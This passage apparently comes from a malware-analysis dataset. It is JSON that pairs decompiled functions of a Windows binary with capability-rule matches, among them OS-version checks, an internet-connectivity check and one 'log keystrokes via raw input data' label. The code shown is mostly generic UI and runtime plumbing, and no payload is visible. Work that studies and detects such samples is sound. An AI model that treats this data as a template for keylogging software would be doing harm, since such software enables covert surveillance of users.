        "decompiled_code": "\nvoid __cdecl fcn.0040dc43(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    \n    if (*arg_ch == 1) {\n        iVar1 = fcn.0040851e(0x405fb2);\n        if (iVar1 != 0) goto code_r0x0040dc6c;\n        do {\n            iVar1 = fcn.00405f96();\ncode_r0x0040dc6c:\n            if (*(iVar1 + 0x74) == in_ECX[8]) {\n                iVar1 = fcn.00410928();\n            }\n            else {\n                iVar1 = (**(*in_ECX + 0x6c))();\n            }\n        } while (iVar1 == 0);\n        iVar3 = arg_ch[2];\n        piVar2 = fcn.0040c45e(iVar1);\n        if (piVar2 != NULL) {\n            (**(*piVar2 + 0x10))(arg_ch, iVar1, iVar3);\n        }\n    }\n    else {\n        iVar1 = fcn.0040d769(in_ECX[8], arg_ch[1], 1);\n        if ((iVar1 != 0) && (iVar1 = fcn.0040d7e2(0),  iVar1 != 0)) {\n            return;\n        }\n    }\n    fcn.0040d3bd();\n    return;\n}\n",
        "token_count": 339
    },
    "0040ddeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ddeb(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (((arg_8h == 1) || (arg_8h == 2)) && (iVar1 = fcn.0040dd4b(arg_ch, 0),  iVar1 != 0)) {\n        return;\n    }\n    fcn.0040d3bd();\n    return;\n}\n",
        "token_count": 97
    },
    "0040e3f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e3f9(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((*arg_ch == 1) && (piVar1 = fcn.0041093c(arg_ch[5]),  piVar1 != NULL)) {\n        (**(*piVar1 + 0xc))(arg_ch);\n        return;\n    }\n    iVar2 = fcn.0040dd4b(arg_ch[5], 0);\n    if (iVar2 == 0) {\n        fcn.0040d3bd();\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "0040e48c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e48c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.00409999(0xc);\n    iVar1 = fcn.0040815e(0x40d9d6);\n    if (iVar1 == 0) {\n        fcn.00405f96();\n    }\n    if (*(iVar1 + 8) == 0) {\n        iVar2 = fcn.00409a30(\"hhctrl.ocx\");\n        *(iVar1 + 4) = iVar2;\n        if (iVar2 != 0) {\n            uVar3 = func_0x00688656(iVar2, \"HtmlHelpA\");\n            return uVar3;\n        }\n        uVar3 = 0;\n    }\n    else {\n        fcn.00409a0b(0xc);\n        uVar3 = (**(iVar1 + 8))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar3;\n}\n",
        "token_count": 256
    },
    "0040e7e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e7e8(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
        "token_count": 91
    },
    "0040e7fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e7fd(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((((*arg_8h == 0) && (arg_8h[1] == 0)) && (arg_8h[2] == 0xc0)) && (arg_8h[3] == 0x46000000)) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 117
    },
    "0040e82d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e82d(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, int32_t **arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar2 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar2 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        iVar2 = fcn.0040e7fd(arg_10h);\n        if (iVar2 == 0) {\n            for (; pcVar1 = arg_ch[2],  pcVar1 != NULL; arg_ch = arg_ch + 3) {\n                iVar2 = *arg_ch;\n                if ((iVar2 == 0) || (iVar3 = fcn.0040e7a9(iVar2, arg_10h),  iVar3 != 0)) {\n                    if (pcVar1 == 0x1) goto code_r0x0040e863;\n                    iVar3 = (*pcVar1)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((iVar2 != 0) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n            }\n            iVar2 = -0x7fffbffe;\n        }\n        else {\ncode_r0x0040e863:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 4))(piVar4);\n            *arg_14h = piVar4;\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 433
    },
    "0040ee48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ee48(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040851e(0x405fb2);\n    if (iVar1 == 0) {\n        fcn.00405f96();\n    }\n    if (*(iVar1 + 0x14) != arg_8h) {\n        if (*(iVar1 + 0x28) == 0) {\n            func_0x00530308();\n            return;\n        }\n        *(iVar1 + 0x14) = arg_8h;\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0040efff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040efff(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    code **ppcVar6;\n    uint32_t uVar7;\n    int32_t *arg_8h_00;\n    code *pcVar8;\n    int32_t unaff_EBP;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint var_7ch;\n    uint var_5ch;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_24h;\n    uint *var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(0x70);\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = 0x7fffffff;\n    uVar7 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (uVar7 == 0x111) {\n        iVar3 = (**(*arg_8h_00 + 0xf0))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar3 == 0) goto code_r0x0040f20f;\n        goto code_r0x0040f03d;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) != 0) {\n            iVar3 = (**(*arg_8h_00 + 0xf4))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\n            goto joined_r0x0040f4e8;\n        }\n        goto code_r0x0040f20f;\n    }\n    var_24h = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        uVar4 = fcn.0040d463(var_24h);\n        fcn.0040e9b8(arg_8h_00, *(unaff_EBP + 0xc), uVar4);\n    }\n    iVar9 = var_24h;\n    if ((uVar7 == 0x20) && (iVar3 = fcn.0040ea30(arg_8h_00, iVar9, var_24h >> 0x10),  iVar3 != 0))\n    goto code_r0x0040f03d;\n    if ((((arg_8h_00[0x13] != 0) && (0 < *(arg_8h_00[0x13] + 0x74))) &&\n        ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) || (uVar7 - 0x281 < 0x11)))) &&\n       (iVar3 = (**(*arg_8h_00[0x13] + 0x94))(uVar7, *(unaff_EBP + 0xc), var_24h, unaff_EBP + -0x10),  iVar3 != 0))\n    goto code_r0x0040f5a1;\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    uVar7 = *(unaff_EBP + 8);\n    *(unaff_EBP + 0x10) = uVar5;\n    fcn.0040c281(7);\n    iVar3 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    *(unaff_EBP + -0x18) = iVar3 + 0x437610;\n    if ((*(unaff_EBP + 8) != *(iVar3 + 0x437610)) || (*(unaff_EBP + 0x10) != *(iVar3 + 0x437618))) {\n        puVar1 = *(unaff_EBP + -0x18);\n        ppcVar6 = *(unaff_EBP + 0x10);\n        *puVar1 = *(unaff_EBP + 8);\n        puVar1[2] = ppcVar6;\n        while (*ppcVar6 != NULL) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar3 = fcn.0040bb22(ppcVar6[1], *(unaff_EBP + 8), 0, 0);\n                *(unaff_EBP + 0x10) = iVar3;\n                if (iVar3 != 0) {\n                    *(*(unaff_EBP + -0x18) + 4) = iVar3;\n                    fcn.0040c2b5();\n                    goto code_r0x0040f19d;\n                }\n            }\n            else {\n                iVar3 = *(*(unaff_EBP + 0x10) + 4);\n                uVar4 = 0xc000;\n                while (iVar3 = fcn.0040bb22(iVar3, uVar4, 0, 0),  iVar3 != 0) {\n                    if (**(iVar3 + 0x10) == *(unaff_EBP + 8)) {\n                        *(*(unaff_EBP + -0x18) + 4) = iVar3;\n                        fcn.0040c2b5();\n                        goto code_r0x0040f593;\n                    }\n                    iVar3 = iVar3 + 0x18;\n                }\n                ppcVar6 = *(unaff_EBP + 0x10);\n            }\n            ppcVar6 = (**ppcVar6)();\n            *(unaff_EBP + 0x10) = ppcVar6;\n        }\n        *(*(unaff_EBP + -0x18) + 4) = 0;\n        fcn.0040c2b5();\n        goto code_r0x0040f20f;\n    }\n    iVar3 = *(iVar3 + 0x437614);\n    *(unaff_EBP + 0x10) = iVar3;\n    fcn.0040c2b5();\n    if (iVar3 == 0) goto code_r0x0040f20f;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x0040f593:\n        pcVar8 = *(iVar3 + 0x14);\n        goto code_r0x0040f597;\n    }\ncode_r0x0040f19d:\n    pcVar8 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar3 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar10 = var_24h >> 0x10;\n    var_14h = var_24h;\n    // switch table (84 cases) at 0x40f5c3\n    switch(iVar3) {\n    case 1:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.00410495(var_14h);\n        goto code_r0x0040f23e;\n    case 2:\n    case 3:\n    case 4:\n    case 0x1b:\n    case 0x1c:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x0040f23e;\n    case 5:\n    case 0xc:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0040d463(uVar7);\n        goto code_r0x0040f273;\n    case 6:\n    case 0x47:\n        var_24h = *(unaff_EBP + 0xc);\n        var_28h = fcn.0040d463(var_24h);\n        goto code_r0x0040f59a;\n    case 7:\n    case 0xd:\n    case 0x4a:\ncode_r0x0040f23e:\n        uVar4 = (*pcVar8)(var_14h);\n        goto code_r0x0040f59e;\n    case 8:\n        fcn.004100aa();\n        uVar4 = var_24h[1];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x24) = uVar4;\n        fcn.0040c2ea();\n        uVar4 = *var_24h;\n        uVar2 = var_24h[2];\n        *(unaff_EBP + -4) = 2;\n        *(unaff_EBP + -0x5c) = uVar4;\n        iVar3 = fcn.0040d48f(uVar4);\n        if (iVar3 == 0) {\n            if ((arg_8h_00[0x13] != 0) && (iVar3 = fcn.00409d7d(*(unaff_EBP + -0x5c)),  iVar3 != 0)) {\n                *(unaff_EBP + -0x2c) = iVar3;\n            }\n            iVar3 = unaff_EBP + -0x7c;\n        }\n        uVar4 = (*pcVar8)(unaff_EBP + -0x28, iVar3, uVar2);\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x5c) = 0;\n        *(unaff_EBP + -0x10) = uVar4;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040dba1();\n        goto code_r0x0040f2f8;\n    case 9:\n        fcn.004100aa();\n        uVar4 = var_24h[2];\n        *(unaff_EBP + -0x24) = var_24h[1];\n        *(unaff_EBP + -4) = 3;\n        uVar4 = (*pcVar8)(unaff_EBP + -0x28, uVar4);\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x10) = uVar4;\ncode_r0x0040f2f8:\n        *(unaff_EBP + -4) = 0;\n        fcn.004104dc();\n        break;\n    case 10:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = fcn.0040d463(var_24h);\n        var_18h = var_24h;\n        goto code_r0x0040f33c;\n    case 0xb:\n        var_24h = *(unaff_EBP + 0xc) >> 0x10;\n        var_28h = *(unaff_EBP + 0xc);\n        goto code_r0x0040f59a;\n    case 0xe:\n    case 0x2f:\n    case 0x4f:\n        goto code_r0x0040f597;\n    case 0xf:\n        var_18h = fcn.00410928(var_24h);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0040f33c:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0040f273:\n        uVar4 = (*pcVar8)(uVar5, uVar7, var_18h, var_14h);\n        goto code_r0x0040f59e;\n    case 0x10:\n    case 0x12:\n    case 0x15:\n    case 0x1e:\n    case 0x2d:\n    case 0x32:\n    case 0x4c:\n    case 0x53:\n        goto code_r0x0040f57c;\n    case 0x11:\n    case 0x14:\n    case 0x54:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x0040f368;\n    case 0x13:\n        (*pcVar8)();\n        break;\n    case 0x16:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        var_18h = *(unaff_EBP + 0xc);\n        goto code_r0x0040f57f;\n    case 0x17:\n        var_14h = iVar10;\n        var_18h = iVar9;\n        goto code_r0x0040f57f;\n    case 0x18:\n    case 0x19:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        goto code_r0x0040f3a0;\n    case 0x1a:\n        fcn.0040d463(var_24h);\n        goto code_r0x0040f57c;\n    case 0x1d:\n    case 0x28:\n    case 0x31:\n        uVar4 = (*pcVar8)();\n        goto code_r0x0040f59e;\n    case 0x1f:\n        var_14h = *(unaff_EBP + 0xc);\n        var_18h = fcn.0040d463(var_14h);\n        fcn.0040d463(var_24h);\n        uVar7 = arg_8h_00[8] == var_24h;\n        goto code_r0x0040f3a4;\n    case 0x20:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.00410495(var_14h);\n        goto code_r0x0040f368;\n    case 0x21:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.00410928(var_14h);\n        goto code_r0x0040f368;\n    case 0x22:\n        var_14h = iVar10;\n        var_18h = iVar9;\n        uVar7 = fcn.00410928(*(unaff_EBP + 0xc), var_18h, var_14h);\n        goto code_r0x0040f3a4;\n    case 0x23:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x0040f3f5;\n    case 0x24:\ncode_r0x0040f3f5:\n        fcn.0040d463(var_14h);\n        goto code_r0x0040f368;\n    case 0x25:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        goto code_r0x0040f408;\n    case 0x26:\n        var_18h = iVar9;\n        var_14h = iVar10;\ncode_r0x0040f408:\n        uVar7 = fcn.0040d463(*(unaff_EBP + 0xc));\n        goto code_r0x0040f3a4;\n    case 0x27:\n        var_18h = fcn.0040d463(*(unaff_EBP + 0xc));\n        goto code_r0x0040f57f;\n    case 0x29:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        var_18h = fcn.0040d463(var_24h);\n        goto code_r0x0040f43a;\n    case 0x2a:\n    case 0x2b:\n        var_18h = *(unaff_EBP + 0xc);\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        *(unaff_EBP + 8) = var_18h;\n        *(unaff_EBP + 0xc) = var_14h;\n        if (iVar3 == 0x2a) {\n            var_18h = fcn.0040d463(var_24h);\n            uVar7 = *(unaff_EBP + 0xc);\n            var_14h = var_24h;\n            goto code_r0x0040f3a4;\n        }\n        goto code_r0x0040f57f;\n    case 0x2c:\n    case 0x33:\ncode_r0x0040f368:\n        (*pcVar8)(var_14h);\n        break;\n    case 0x2e:\n    case 0x36:\n    case 0x52:\n        (*pcVar8)(*(unaff_EBP + 0xc), var_24h);\n        goto code_r0x0040f03d;\n    case 0x30:\n    case 0x46:\n        var_28h = iVar9;\n        var_24h = iVar10;\n        goto code_r0x0040f59a;\n    case 0x34:\n        var_18h = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0040f43a:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0040f3a4;\n    case 0x35:\n        var_18h = iVar9;\n        var_14h = iVar10;\ncode_r0x0040f3a0:\n        uVar7 = *(unaff_EBP + 0xc);\ncode_r0x0040f3a4:\n        (*pcVar8)(uVar7, var_18h, var_14h);\n        break;\n    case 0x37:\n        iVar3 = (*pcVar8)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, iVar9, iVar10);\n        *(unaff_EBP + -0x10) = iVar3;\n        goto joined_r0x0040f4e8;\n    case 0x38:\n        (*pcVar8)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, iVar9, iVar10);\n        break;\n    case 0x45:\n        iVar3 = (*pcVar8)();\n        *(unaff_EBP + -0x10) = iVar3;\njoined_r0x0040f4e8:\n        if (iVar3 != 0) {\ncode_r0x0040f20f:\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040c2b5();\n            goto code_r0x0040f21d;\n        }\n        break;\n    case 0x48:\n        fcn.00410928(var_24h);\ncode_r0x0040f57c:\n        var_18h = *(unaff_EBP + 0xc);\n        goto code_r0x0040f57f;\n    case 0x49:\n        var_24h = fcn.00410928(var_24h);\n        goto code_r0x0040f597;\n    case 0x4b:\n        var_18h = fcn.00410928(*(unaff_EBP + 0xc), var_24h);\n        goto code_r0x0040f57f;\n    case 0x4d:\n        var_14h = var_24h & 0xffff;\n        var_18h = var_24h >> 0x10 & 0xf000;\n        uVar5 = var_24h >> 0x10 & 0xfff;\n        uVar7 = fcn.0040d463(*(unaff_EBP + 0xc));\n        goto code_r0x0040f539;\n    case 0x4e:\n        var_18h = *(unaff_EBP + 0xc);\ncode_r0x0040f57f:\n        (*pcVar8)(var_18h, var_14h);\n        break;\n    case 0x50:\n        var_18h = iVar9;\n        var_14h = iVar10;\n        uVar5 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0040f539;\n    case 0x51:\n        var_18h = iVar9;\n        var_14h = iVar10;\n        uVar5 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\ncode_r0x0040f539:\n        (*pcVar8)(uVar7, uVar5, var_18h, var_14h);\ncode_r0x0040f03d:\n        *(unaff_EBP + -0x10) = 1;\n    }\ncode_r0x0040f5a1:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040c2b5();\ncode_r0x0040f21d:\n    fcn.00412353();\n    return;\ncode_r0x0040f597:\n    var_28h = *(unaff_EBP + 0xc);\ncode_r0x0040f59a:\n    uVar4 = (*pcVar8)(var_28h, var_24h);\ncode_r0x0040f59e:\n    *(unaff_EBP + -0x10) = uVar4;\n    goto code_r0x0040f5a1;\n}\n",
        "token_count": 5061
    },
    "0040fb4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040fb4d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_38h;\n    uint var_4h;\n    \n    fcn.004122ae(0x30);\n    arg_8h_00 = *(unaff_EBP + 8);\n    iVar2 = fcn.0040c04f(*(arg_8h_00 + 0x10), *(arg_8h_00 + 0x24), unaff_EBP + -0x38);\n    if (((iVar2 == 0) && (iVar1 = fcn.0040bfbd(arg_8h_00),  iVar1 != 0)) &&\n       (iVar2 = fcn.00407ce3(),  *(iVar2 + 0x14) != '\\0')) {\n        fcn.00409999(1);\n        *(unaff_EBP + -4) = 0;\n        fcn.00407ce3();\n        fcn.00404070(*(arg_8h_00 + 0x24));\n        fcn.00405da6(10);\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00409a0b(1);\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 330
    },
    "00410421": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00410421(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041227b(0);\n    iVar1 = fcn.00407d16();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        arg_8h_00 = fcn.00405aac(fcn.00409bd0);\n        iVar2 = fcn.00405ac3(0x60);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.0040aeee(0x42dbfc, fcn.004103c4, fcn.00410097, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar3;\n        fcn.00405aac(arg_8h_00);\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 324
    },
    "004104dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004104dc(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.004104a9();\n        fcn.006d5cd0(uVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004104f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004104f5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041227b(0);\n    iVar1 = fcn.00407d16();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        arg_8h_00 = fcn.00405aac(fcn.00409bd0);\n        iVar2 = fcn.00405ac3(0x60);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.0040aeee(0x42dc18, fcn.004103e5, fcn.00410097, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar3;\n        fcn.00405aac(arg_8h_00);\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 323
    },
    "004105a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004105a9(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    fcn.0041057d();\n    uVar1 = fcn.0071de3a();\n    return uVar1;\n}\n",
        "token_count": 78
    },
    "004107eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004107eb(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *in_ECX;\n    \n    if (arg_8h < 4) {\n        arg_8h = 4;\n    }\n    if (arg_ch < 2) {\n        arg_ch = 0x40;\n    }\n    in_ECX[3] = 0;\n    in_ECX[2] = 0;\n    *in_ECX = arg_8h;\n    in_ECX[1] = arg_ch;\n    return;\n}\n",
        "token_count": 127
    },
    "00410835": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410835(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.0040a846(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1] + -1;\n        piVar2 = iVar1 + 4 + *param_1 * iVar3;\n        for (; -1 < iVar3; iVar3 = iVar3 + -1) {\n            *piVar2 = param_1[3];\n            param_1[3] = piVar2;\n            piVar2 = piVar2 - *param_1;\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 199
    },
    "004108b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
